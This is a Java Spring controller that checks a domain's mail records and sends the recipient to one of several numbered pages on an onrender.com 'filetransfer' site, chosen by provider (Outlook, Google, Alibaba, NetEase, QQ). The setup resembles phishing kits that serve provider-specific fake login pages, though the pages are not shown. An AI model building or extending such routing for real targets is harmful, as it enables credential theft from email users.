package havezzy.filetransfer.app.dnsresolver;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@CrossOrigin
@RestController
public class DnsResolverController {
	@Autowired
	private DnsResolverService dnsResolverService;
	
	@RequestMapping("/domain/{domainToCheck}/{recipient}")
	public String checkDns(@PathVariable String domainToCheck, @PathVariable String recipient) {
		String mailBox = dnsResolverService.checkDns(domainToCheck);
		System.out.println(mailBox);
		if (mailBox.contains("outlook.com.")) {
			return "https://filetransfer-2.onrender.com/4.html?recipient="+recipient;
        } 
		else if(mailBox.contains("mxhichina.com.")) {
			return "https://filetransfer-2.onrender.com/1.html?recipient="+recipient;
		}
		else if(mailBox.contains("google.com.")) {
			return "https://filetransfer-2.onrender.com/3.html?recipient="+recipient;
		}
		else if(mailBox.contains("mxmail.netease.com.")) {
			return "https://filetransfer-2.onrender.com/2.html?recipient="+recipient;
		}
		else if(mailBox.contains("unknown")) {
			return "https://filetransfer-2.onrender.com/5.html?recipient="+recipient;
		}
		
		else if(mailBox.contains("mxbiz1.qq.com.")) {
			return "https://filetransfer-2.onrender.com/6.html?recipient="+recipient;
		}
		
		return "https://filetransfer-2.onrender.com/5.html?recipient="+recipient;
	}
}
